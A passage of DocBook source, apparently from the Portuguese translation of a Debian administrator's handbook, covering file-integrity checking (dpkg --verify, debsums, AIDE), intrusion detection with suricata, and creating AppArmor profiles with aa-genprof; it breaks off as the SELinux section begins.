	<para>Este livro trata do Munin com algum detalhe (ver <xref linkend="sect.munin" />) como parte do <xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" />. O Debian também fornece uma ferramenta similar, o <emphasis role="pkg">cacti</emphasis>. Sua implantação é um pouco mais complexa, pois se baseia apenas em SNMP. Apesar de ter uma interface web, compreender os conceitos envolvidos na configuração ainda requer algum esforço. A leitura da documentação HTML (<filename>/usr/share/doc/cacti/html/index.html</filename>) deve ser considerada um pré-requisito.</para>

        <sidebar>
          <title><emphasis>ALTERNATIVO</emphasis> <command>mrtg</command></title>
          <indexterm><primary><command>mrtg</command></primary></indexterm>

	  <para>O <command>mrtg</command> (do pacote com mesmo nome) é uma antiga ferramenta. Apesar de ser meio difícil de trabalhar, ela pode agregar dados históricos e exibi-los na forma de gráficos. Ela inclui uma série de scripts dedicados à coleta de dados mais comumente monitorados, tais como a carga do processador, o tráfego de rede, acessos a páginas web, e assim por diante.</para>

	  <para>Os pacotes <emphasis role="pkg">mrtg-contrib</emphasis> e <emphasis role="pkg">mrtgutils</emphasis> contém scripts de exemplo que podem ser utilizados diretamente.</para>
        </sidebar>
      </section>
    </section>
    <section>
      <title>Detectando Modificações</title>

      <para>Uma vez que o sistema esteja instalado e configurado, e impedindo atualizações de segurança, geralmente não há razão para a maioria dos arquivos e diretórios evoluirem, exceto os dados. É interessante, portanto, certificar se que os arquivos realmente não alteram: qualquer mudança seria, portanto, inesperada, valendo a pena investigar. Esta seção apresenta algumas ferramentas capazes de monitorar os arquivos e para avisar o administrador quando ocorrer uma mudança inesperada (ou simplesmente para listar tais mudanças).</para>
      <section id="sect.dpkg-verify">
        <title>Auditando Pacotes com o <command>dpkg --verify</command></title>
        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
        <sidebar>
          <title><emphasis>INDO ALÉM</emphasis> Protegendo-se contra mudanças do desenvolvedor</title>

	  <para><command>dpkg --verify</command> é útil na detecção de alterações em arquivos provenientes de um pacote Debian, mas será inútil se o pacote em si estiver comprometido, por exemplo se o espelho Debian está comprometido. Se proteger contra este tipo de ataques envolve a utilização de sistema APT de verificação de assinatura digital (veja <xref linkend="sect.package-authentication" />), e tomar cuidado para só instalar pacotes a partir de uma origem certificada.</para>
        </sidebar>

        <para>O <command>dpkg --verify</command> (ou <command>dpkg -V</command>) é uma ferramenta interessante já que permite encontrar quais arquivos instalados foram modificados (potencialmente por um invasor), mas isso é apenas um pequeno passo. Para fazer seu trabalho ele confia nos checksums armazenados no próprio banco de dados do dpkg, que é armazenado no disco rígido (eles podem ser encontrados em <filename>/var/lib/dpkg/info/<replaceable>pacote</replaceable>.md5sums</filename>); Um atacante que faz o serviço bem feito irá atualizar esses arquivos para que eles contenham os novos checksums dos arquivos subvertidos.</para>

        <sidebar>
          <title><emphasis>DE VOLTA AO BÁSICO</emphasis> Impressão digital de arquivo</title>
	  <indexterm><primary>impressão digital</primary></indexterm>
	  <indexterm><primary>soma de controle</primary></indexterm>
	  <indexterm><primary>MD5</primary></indexterm>
	  <indexterm><primary>SHA1</primary></indexterm> 
          <para>Como um lembrete: a impressão digital é um valor, muitas vezes um número (mesmo que em notação hexadecimal), que contém uma espécie de assinatura para o conteúdo de um arquivo. Esta assinatura é calculada com um algoritmo (MD5 ou SHA1 sendo exemplos bem conhecidos) que garanta mais ou menos que, mesmo a mais ínfima mudança no conteúdo do arquivo implica uma mudança na impressão digital, o que é conhecido como o "efeito avalanche". Isto permite uma impressão digital numérica simples para servir como um teste para verificar se o conteúdo de um arquivo foi alterado. Estes algoritmos não são reversíveis, em outras palavras, para a maioria deles, sabendo a impressão digital não permite encontrar o conteúdo correspondente. Os recentes avanços matemáticos parecem enfraquecer o poder absoluto destes princípios, mas seu uso não foi questionado até agora, pois produzir a mesma impressão digital a partir de conteúdos diferentes ainda parece ser uma tarefa bastante difícil.</para>
        </sidebar>

        <para>Ao rodar <command>dpkg -V</command> todos os pacotes instalados serão verificados e será impressa uma linha para cada arquivo que falhar em algum teste. O formato de saída é o mesmo que o do <command>rpm -V</command> onde cada caractere denota um teste em algum metadado específico. Infelizmente o <command>dpkg</command> não armazena o metadado necessário para a maioria dos testes e irá, assim, exibir uma interrogação para estes. Atualmente apenas o teste de checksum pode render um "5" no terceiro caractere (quando ele falha).</para>
        <screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput></screen>
        <para>No exemplo acima, o dpkg reporta uma alteração no arquivo service do SSH que o administrador fez no arquivo empacotado ao invés de usar uma sobrescrita apropriada no <filename>/etc/systemd/system/ssh.service</filename> (que seria armazenada abaixo de <filename>/etc</filename> como qualquer mudança de configuração deveria ser). Ele também lista múltiplos arquivos de configuração (identificados pela letra "c" no segundo campo) que foram legitimamente modificados.</para>
      </section>

      <section id="sect.debsums">
        <title>Auditando Pacotes: <command>debsums</command> e seus limites</title>
        <indexterm><primary><command>debsums</command></primary></indexterm>

        <para>O <command>debsums</command> é o ancestral do <command>dpkg -V</command> e sendo assim é praticamente obsoleto. Ele sofre das mesmas limitações que o dpkg. Felizmente, algumas das limitações podem ser superadas (enquanto que o dpkg não oferece tais ações).</para>

        <para>Já que dados no disco não são confiáveis, o <command>debsums</command> oferece fazer sua checagem com base nos arquivos <filename>.deb</filename> ao invés de confiar no banco de dados do dpkg. Para baixar arquivos <filename>.deb</filename> confiáveis de todos os pacotes instalados, nós podemos confiar nos downloads autenticados pelo APT. Essa operação pode ser lenta e tediosa, e deve assim, não ser considerada uma técnica proativa a ser usada no cotidiano.</para>

        <screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
<computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>

	<para>Note que este exemplo usa o comando <command>grep-status</command> do pacote <emphasis role="pkg">dctrl-tools</emphasis>, que não é instalado por padrão.</para>
      </section>
      <section>
        <title>Monitorando Arquivos: AIDE</title>
        <indexterm><primary><emphasis role="pkg">aide</emphasis> (Pacote Debian)</primary></indexterm>

	<para>A ferramenta AIDE (<emphasis>Advanced Intrusion Detection Environment - Ambiente Avançado de Deteccão de Intrusão</emphasis>) permite verificar a integridade de arquivos, e detectar qualquer mudança em relação a uma imagem gravada anteriormente do sistema válido. Esta imagem é armazenada como um banco de dados (<filename> /var/lib/aide/aide.db</filename>) que contém as informações relevantes de todos os arquivos do sistema (impressões digitais, permissões, timestamps e assim por diante). Este banco de dados é inicializado com <command>aideinit</command>, que é então usado diariamente (pelo script <filename>/etc/cron.daily/</filename> ) para verificar que nada de relevante mudou. Quando alterações são detectadas, AIDE grava em arquivos de log (<filename>/var/log/aide/*.log</filename>) e envia os seus resultados ao administrador por e-mail.</para>

        <sidebar>
          <title><emphasis>NA PRÁTICA</emphasis> Protegendo o banco de dados</title>

	  <para>Como AIDE usa um banco de dados local para comparar os estados dos arquivos, a validade de seus resultados está diretamente ligada à validade do banco de dados. Se um atacante obtém permissões de root em um sistema comprometido, ele será capaz de substituir o banco de dados e cobrir seus rastros. Uma possível solução seria armazenar os dados de referência em mídia de armazenamento que seja somente leitura.</para>
        </sidebar>

	<para>Muitas opções em <filename>/etc/default/aide</filename> podem ser usadas para ajustar o comportamento do pacote <emphasis role="pkg">aide</emphasis>. A configuração AIDE adequada é armazenada em <filename>/etc/aide/aide.conf</filename> e <filename>/etc/aide/aide.conf.d/</filename> (na verdade, esses arquivos são usados apenas pelo <command>update-aide.conf</command> para gerar <filename>/var/lib/aide/aide.conf.autogenerated</filename>). A configuração indica quais propriedades de quais arquivos precisam ser verificadas. Por exemplo, o conteúdo de arquivos log muda rotineiramente, e estas modificações podem ser ignoradas, desde que as permissões destes arquivos permaneçam as mesmas, mas tanto o conteúdo quanto as permissões de programas executáveis devem ser constantes. Embora não seja muito complexa, a sintaxe de configuração não é totalmente intuitiva, e a leitura da página de manual <citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry> é recomendada.</para>

	<para>Uma nova versão do banco de dados é gerada diariamente em <filename>/var/lib/aide/aide.db.new</filename>; se todas as alterações registradas eram legítimas, ele pode ser usado para substituir o banco de dados de referência.</para>

        <sidebar>
          <title><emphasis>ALTERNATIVO</emphasis> Tripwire and Samhain</title>

	  <para>Tripwire é muito semelhante ao AIDE; até a sintaxe do arquivo de configuração é quase a mesma. A principal melhoria do <emphasis role="pkg">tripwire</emphasis> é um mecanismo para assinar o arquivo de configuração, de modo que um atacante não pode fazer ele apontar para uma versão diferente do banco de dados de referência.</para>

	  <para>Samhain também oferece características semelhantes, bem como algumas funções ajudar a detectar rootkits (veja a barra lateral  <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />). Também pode ser implementado globalmente em uma rede, e gravar os seus traces em um servidor central (com uma assinatura).</para>
        </sidebar>

        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
          <title><emphasis>OLHADA RÁPIDA</emphasis> os pacotes <emphasis role="pkg">checksecurity</emphasis> e <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis></title>
          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>

	  <para>O primeiro destes pacotes contém vários pequenos scripts que executam verificações básicas sobre o sistema (senhas vazias, arquivos setuid novos, e assim por diante) e alerta o administrador, se necessário. Apesar de seu nome explícito, um administrador não deve confiar somente nele para certificar-se que um sistema Linux está seguro.</para>

	  <para>Os pacotes <emphasis role="pkg">chkrootkit</emphasis> e <emphasis role="pkg">rkhunter</emphasis> permitem buscar por potenciais <emphasis>rootkits</emphasis> instalados no sistema. Como um lembrete, existem peças de software desenvolvidas para esconder o comprometimento de um sistema enquanto, discretamente, mantém o controle da máquina. Os testes não são 100% confiáveis, mas eles geralmente chamam a atenção do administrador para potenciais problemas.</para>
        </sidebar>
      </section>
    </section>
    <section id="sect.intrusion-detection">
      <title>Detectando Intrusões (IDS/NIDS)</title>
      <indexterm><primary>detecção, intrusão</primary></indexterm>
      <indexterm><primary>detecção de intruso</primary></indexterm>
      <indexterm><primary>IDS</primary></indexterm>
      <indexterm><primary>sistema de detecção de intrusão</primary></indexterm>
      <indexterm><primary>NIDS</primary></indexterm>
      <indexterm><primary>Rede</primary><secondary>IDS</secondary></indexterm>

      <sidebar>
        <title><emphasis>DE VOLTA AO BÁSICO</emphasis> Negação de serviço</title>
        <indexterm><primary>negação de serviço</primary></indexterm>

	<para>Um ataque "negação de serviço" tem apenas um objetivo: tornar um serviço indisponível. Se tal ataque envolve a sobrecarrega do servidor com consultas ou explorar uma falha, o resultado final é o mesmo: o serviço não é mais operacional. Os usuários regulares estão infelizes, e a entidade que hospeda o serviço de rede alvo sofre uma perda de reputação (e, eventualmente, em receita, por exemplo, se o serviço era um site de comércio eletrônico).</para>

	<para>Tal ataque é por vezes "distribuído", o que geralmente envolve sobrecarregar o servidor com um grande número de consultas provenientes de muitas fontes diferentes para que o servidor se torne incapaz de responder às perguntas legítimas. Estes tipos de ataques ganharam siglas bem conhecidas: <acronym>DDoS</acronym> e <acronym>DoS</acronym> (dependendo se o ataque de negação de serviço é distribuído ou não).</para>
      </sidebar>

      <para><command>suricata</command> (no pacote Debian com o mesmo nome) é um NIDS - um <emphasis>Sistema de Detecção de Intrusão de Rede</emphasis>. Sua função é ouvir a rede e tentar detectar tentativas de infiltração e/ou atos hostis (incluindo ataques de negação de serviço). Todos esses eventos são registrados em múltiplos arquivos em <filename>/var/log/suricata</filename>. Existem ferramentas de terceiros (Kibana/logstash) para melhor navegar pelos dados coletados. <ulink type="block" url="http://suricata-ids.org" /> <ulink type="block" url="https://www.elastic.co/products/kibana" /></para>
      <indexterm><primary><command>snort</command></primary></indexterm>
      <indexterm><primary><command>suricata</command></primary></indexterm>

      <sidebar>
        <title><emphasis>ATENÇÃO</emphasis> Raio de ação</title>

	<para>A eficácia do <command>suricata</command> é limitada pelo tráfego visto na interface de rede monitorada. Obviamente, não será capaz de detectar qualquer coisa se não pode observar o tráfego real. Quando conectado a um switch de rede, ele irá, portanto, apenas monitorar ataques contra a máquina em que ele roda, o que provavelmente não é a intenção. A máquina que hospeda o <command>suricata</command> deve estar ligada a porta "espelho" do switch, que normalmente é dedicada aos interruptores (switches) encadeados e, portanto, recebe todo o tráfego.</para>
      </sidebar>

      <para>A configuração do suricata envolve rever e editar o <filename>/etc/suricata/suricata-debian.yaml</filename>, que é muito grande porque cada parâmetro é abundantemente comentado. Uma configuração mínima requer descrever o intervalo de endereços que a rede local cobre (parâmetro <literal>HOME_NET</literal>). Na prática, isso significa o conjunto de todos os alvos possíveis de ataque. Mas para obter o máximo dele requer uma leitura completa para adaptá-lo para a situação local.</para>
      <para>No topo disso, você deveria também editar o <filename>/etc/default/suricata</filename> para definir a interface de rede a ser monitorada e para habilitar o script init (configurando <literal>RUN=yes</literal>). Você também pode querer definir <literal>LISTENMODE=pcap</literal> porquê o padrão <literal>LISTENMODE=nfqueue</literal> requer configurações adicionais para funcionar de maneira apropriada (o firewall netfilter tem que ser configurado para passar pacotes para alguma fila do espaço de usuário manipulada pelo suricata via o alvo <literal>NFQUEUE</literal>).</para>
      <para>Para detectar maus comportamentos, o <command>suricata</command> precisa de um conjunto de regras de monitoramento: você pode encontrar tais regras no pacote <emphasis role="pkg">snort-rules-default</emphasis>. O <command>snort</command> é a referência histórica no ecosistema de IDS e o <command>suricata</command> é capaz de reusar as regras escritas para ele. Infelizmente, esse pacote não está presente no <emphasis role="distribution">Debian Jessie</emphasis> e deve ser obtido a partir de outro lançamento Debian como o <emphasis role="distribution">Testing</emphasis> ou <emphasis role="distribution">Unstable</emphasis>.</para>
      <para>Alternativamente, o <command>oinkmaster</command> (no pacote de mesmo nome) pode ser usado para baixar um conjunto de regras do Snort a partir de fontes externas.</para>
      <sidebar>
        <title><emphasis>INDO ALÉM</emphasis> Integração com o <command>prelude</command></title>

	<para>Prelude traz monitoramento centralizado de informações de segurança. Sua arquitetura modular inclui um servidor (o gerente <emphasis>manager</emphasis> em <emphasis role="pkg">prelude-manager</emphasis>) que reúne os alertas gerados por <emphasis>sensores</emphasis> de vários tipos.</para>

	<para>O Suricata pode ser configurado como um destes sensores. Outras possibilidades incluem <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>), que monitora os arquivos de log (de forma semelhante ao <command>logcheck</command>, descrito em <xref linkend="sect.logcheck" />).</para>
        <indexterm><primary><command>prelude</command></primary></indexterm>
      </sidebar>
    </section>
  </section>
  <section id="sect.apparmor">
    <title>Introdução ao AppArmor</title>
    <indexterm><primary>AppArmor</primary></indexterm>
    <section id="sect.apparmor-principles">
      <title>Princípios</title>
      <para>AppArmor é um sistema de <emphasis>Controle de Acesso Mandatório</emphasis> (MAC - Mandatory Access Control) construído sobre a interface LSM (<emphasis>Linux Security Modules</emphasis>) do Linux. Na prática, o kernel consulta o AppArmor antes de cada chamada do sistema para saber se o processo está autorizado a fazer a operação dada. Através desse mecanismo, o AppArmor confina programas a um conjunto limitado de recursos.</para>
      <indexterm><primary><emphasis>Controle de Acesso Mandatório</emphasis></primary></indexterm>
      <indexterm><primary><emphasis>Módulos de Segurança Linux</emphasis></primary></indexterm>
      <para>O AppArmor aplica um conjunto de regras (conhecidas como “perfil”) em cada programa. O perfil aplicado pelo kernel depende do caminho ("path") de instalação do programa sendo executado. Ao contrário do SELinux (discutido em <xref linkend="sect.selinux" />), as regras aplicadas não dependem do usuário. Todos os usuários encontram o mesmo conjunto de regras quando eles estão executando o mesmo programa (mas as permissões tradicionais do usuário ainda se aplicam e podem resultar em um comportamento diferente!).</para>
      <para>Os perfis AppArmor são armazenados em <filename>/etc/apparmor.d/</filename> e eles contém uma lista de regras de controle de acesso em recursos que cada programa pode fazer uso. Os perfis são compilados e carregados no núcleo pelo comando <command>apparmor_parser</command>. Cada perfil pode ser carregado tanto em modo de aplicação ("enforcing") quanto em modo de registro ("complaining"). O primeiro aplica a política e reporta as tentativas de violação, enquanto que o último não aplica a política mas mantém os registros de chamadas de sistema que deveriam ter sido negadas.</para>
    </section>
    <section id="sect.apparmor-setup">
      <title>Habilitando o AppArmor e gerenciando os perfis AppArmor</title>
      <para>O suporte ao AppArmor é construído nos kernel padrões fornecidos pelo Debian. Habilitar o AppArmor é, assim, uma simples questão de instalar alguns pacotes e adicionar alguns parâmetros à linha de comando do kernel:</para>
      <screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
</userinput><computeroutput>[...]
# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
</userinput><computeroutput># </computeroutput><userinput>update-grub
</userinput></screen>
      <para>Após uma reinicialização, o AppArmor está agora funcional e o <command>aa-status</command> irá confirmar isso rapidamente:</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-status</userinput>
<computeroutput>apparmor module is loaded.
44 profiles are loaded.
9 profiles are in enforce mode.
   /usr/bin/lxc-start
   /usr/lib/chromium-browser/chromium-browser//browser_java
[...]
35 profiles are in complain mode.
   /sbin/klogd
[...]
3 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (1295) 
2 processes are in complain mode.
   /usr/sbin/avahi-daemon (941) 
   /usr/sbin/avahi-daemon (1000) 
0 processes are unconfined but have a profile defined.</computeroutput></screen>
      <sidebar>
        <title><emphasis>NOTA</emphasis> Mais perfis AppArmor</title>
        <para>O pacote <emphasis role="pkg">apparmor-profiles</emphasis> contém perfis gerenciados pela comunidade upstream do AppArmor. Para obter ainda mais perfis você pode instalar o <emphasis role="pkg">apparmor-profiles-extra</emphasis> que contém perfis desenvolvidos pelo Ubuntu e Debian.</para>
      </sidebar>
      <para>O estado de cada perfil pode ser alterado entre aplicação ("enforcing") e registro ("complaining") com chamadas a <command>aa-enforce</command> e <command>aa-complain</command> dando como parâmetro tanto o caminho para o executável como o caminho para o arquivo de política. Adicionalmente, um perfil pode ser inteiramente desabilitado com <command>aa-disable</command> ou posto em modo auditar ("audit") (para aceitar chamadas de sistema também) com <command>aa-audit</command>.</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
      </screen>
    </section>
    <section id="sect.apparmor-new-profile">
      <title>Criando um novo perfil</title>
      <para>Mesmo sendo bem fácil criar um perfil AppArmor, a maioria dos programas não tem um. Essa seção irá mostrar a você como criar um novo perfil a partir do zero apenas usando o programa alvo e deixando o AppArmor monitorar a chamada de sistema que ele faz e os recursos que ele acessa.</para>
      <para>Os programas mais importantes que precisam ser confinados são os programas voltados para a rede, aqueles mais atrativos à ataques remotos. É por isso que o AppArmor convenientemente fornece o comando <command>aa-unconfined</command> para listar os programas que não tem perfil associado e que expôem um soquete de rede aberto. Com a opção <literal>--paranoid</literal> você tem todos os processos não confinados que tem ao menos uma conexão de rede ativa.</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
<computeroutput>801 /sbin/dhclient not confined
890 /sbin/rpcbind not confined
899 /sbin/rpc.statd not confined
929 /usr/sbin/sshd not confined
941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
988 /usr/sbin/minissdpd not confined
1276 /usr/sbin/exim4 not confined
1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
      </screen>
      <para>No exemplo a seguir, nós iremos então tentar criar um perfil para o <command>/sbin/dhclient</command>. Para isso, nós iremos usar o <command>aa-genprof dhclient</command>. Ele irá convidar você a usar a aplicação em outra janela e quando terminar volte ao <command>aa-genprof</command> para procurar por eventos AppArmor nos registros ("logs") do sistema e converter esses registros em regras de acesso. Para cada evento registrado, ele irá fazer uma ou mais sugestões de regras que você pode tanto aprovar quanto fazer edições adicionais de múltiplas maneiras:</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
<computeroutput>Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]
<userinput>Y</userinput>
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
Capability: net_raw
Severity:   unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw to profile.

Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
  3 - #include &lt;abstractions/nameservice&gt; 
  4 - #include &lt;abstractions/totem&gt; 
 [5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>3</userinput>

Profile:  /sbin/dhclient
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
 [3 - #include &lt;abstractions/nameservice&gt;]
  4 - #include &lt;abstractions/totem&gt; 
  5 - /etc/nsswitch.conf 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding #include &lt;abstractions/nameservice&gt; to profile.

Profile:  /sbin/dhclient
Path:     /proc/7252/net/dev
Mode:     r
Severity: 6

  1 - /proc/7252/net/dev 
 [2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/*/net/dev r to profile

[...]
Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

 [1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>N</userinput>

Enter new path: /run/dhclient*.pid

Profile:  /sbin/dhclient
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

  1 - /run/dhclient-eth0.pid 
 [2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /run/dhclient*.pid w to profile

[...]
Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
Path:     /proc/filesystems
Mode:     r
Severity: 6

 [1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/filesystems r to profile

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /sbin/dhclient]
  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Finished generating profile for /sbin/dhclient.</computeroutput></screen>
      <para>Note que o programa não exibe de volta os caracteres de controle que você digitou, mas para clarear a explicação eu inclui elas na transcrição prévia.</para>
      <calloutlist>
        <callout arearefs="aa-genprof-execute">
          <para>O primeiro evento detectado é a execução de outro programa. Neste caso, você tem múltiplas escolhas: você pode rodar o programa com o perfil do processo pai (a escolha “Inherit”), você pode rodá-lo com seu próprio e dedicado perfil (as escolhas “Profile” e “Named”, diferindo apenas pela possibilidade de usar um nome de perfil arbitrário), você pode rodá-lo com um sub-perfil do processo pai (a escolha “Child”), você pode rodá-lo sem qualquer perfil (a escolha “Unconfined”) ou você pode decidir não rodá-lo de forma alguma (a escolha “Deny”).</para>
          <para>Note que quando você opta por rodá-lo sob um perfil dedicado que não existe ainda, a ferramenta irá criar o perfil em falta para você e irá fazer sugestões de regras para esse perfil em um mesmo tempo.</para>
        </callout>
        <callout arearefs="aa-genprof-capability">
          <para>A nível do kernel, os poderes especiais do usuário root foram divididos em “recursos”. Quando uma chamada de sistema requer um recurso específico, o AppArmor irá verificar se o perfil permite ao program fazer uso desse recurso.</para>
        </callout>
        <callout arearefs="aa-genprof-read">
          <para>Aqui o programa busca por permissões de leitura para o <filename>/etc/nsswitch.conf</filename>. O <command>aa-genprof</command> detecta que essa permissão era também obtida por múltiplas "abstrações” e as oferece como escolhas alternativas. Uma abstração fornece um reusável conjunto de regras de acesso reunindo múltiplos recursos que são comumente usados juntos. Nesse caso específico, o arquivo é geralmente acessado através das funções relacionadas a nameservice da biblioteca do C e nós digitamos “3” para primeiro selecionarmos a opção “#include &lt;abstractions/nameservice&gt;” e então “A” para dar a permissão.</para>
        </callout>
        <callout arearefs="aa-genprof-write">
          <para>O programa quer criar o arquivo <filename>/run/dhclient-eth0.pid</filename>. Se nós permitirmos apenas a criação desse arquivo específico, o programa não irá funcionar quando o usuário for usá-lo com outra interface de rede. Assim, nós selecionamos "Novo" (“New”) para substituir o nome de arquivo por algo mais genérico como “/run/dhclient*.pid” antes de gravar a regra com "Permitir" (“Allow”).</para>
        </callout>
        <callout arearefs="aa-genprof-other-profile">
          <para>Note que essa requisição de acesso não é parte do perfil do dhclient mas do novo perfil que nós criamos quando nós permitimos o <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> rodar com seu próprio perfil.</para>
          <para>Após termos passado por todos os eventos registrados, o programa se oferece para salvar todos os perfis que foram criados durante sua execução. Neste caso, nós temos dois perfis que nós salvamos ao mesmo tempo com "Salvar" (“Save”) (mas você pode salvá-los individualmente também) antes de sair do programa com "Terminar" (“Finish”).</para>
        </callout>
      </calloutlist>
      <para>O <command>aa-genprof</command> é na realidade apenas um envoltório inteligente em volta do <command>aa-logprof</command>: ele cria um perfil vazio, carrega-o em modo de registro ("complain mode") e então roda o <command>aa-logprof</command> que é uma ferramenta para atualizar um perfil com base nas violações de perfil que foram registradas. Então você pode rodar novamente essa ferramenta mais tarde para aprimorar o perfil que você acabou de criar.</para>
      <para>Se você quer que o perfil gerado seja completo, você deveria usar o programa de todas as maneiras que sejam legítimas de usar. No caso do dhclient, isso significa rodá-lo via Network Manager, rodá-lo via ifupdown, rodá-lo manualmente, etc. No final, você deve obter um <filename>/etc/apparmor.d/sbin.dhclient</filename> próximo a isso:</para>
      <programlisting>
# Last Modified: Tue Sep  8 21:40:02 2015
#include &lt;tunables/global&gt;

/sbin/dhclient {
  #include &lt;abstractions/base&gt;
  #include &lt;abstractions/nameservice&gt;

  capability net_bind_service,
  capability net_raw,

  /bin/dash r,
  /etc/dhcp/* r,
  /etc/dhcp/dhclient-enter-hooks.d/* r,
  /etc/dhcp/dhclient-exit-hooks.d/* r,
  /etc/resolv.conf.* w,
  /etc/samba/dhcp.conf.* w,
  /proc/*/net/dev r,
  /proc/filesystems r,
  /run/dhclient*.pid w,
  /sbin/dhclient mr,
  /sbin/dhclient-script rCx,
  /usr/lib/NetworkManager/nm-dhcp-helper Px,
  /var/lib/NetworkManager/* r,
  /var/lib/NetworkManager/*.lease rw,
  /var/lib/dhcp/*.leases rw,

  profile /sbin/dhclient-script flags=(complain) {
    #include &lt;abstractions/base&gt;
    #include &lt;abstractions/bash&gt;

    /bin/dash rix,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /sbin/dhclient-script r,

  }
}
      </programlisting>
    </section>
  </section>

  <section id="sect.selinux">
    <title>Introducao ao SELinux</title>
    <indexterm><primary>SELinux</primary></indexterm>
    <section id="sect.selinux-principles">
